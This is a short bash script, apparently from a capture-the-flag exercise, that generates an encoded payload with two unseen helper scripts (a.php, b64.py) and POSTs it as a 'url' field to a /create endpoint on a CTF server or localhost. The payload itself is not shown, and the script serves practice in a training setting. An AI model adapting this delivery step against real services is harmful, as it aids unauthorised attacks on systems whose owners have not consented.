#!/bin/bash

php a.php

OUT=`python2 b64.py`
#URL=http://edu-ctf.zoolab.org:10099/create
URL=http://localhost:10004/create
#curl -X POST "http://localhost:10004/create" -d "url=$OUT"
curl -X POST "http://edu-ctf.zoolab.org:10099/create" -d "url=$OUT"
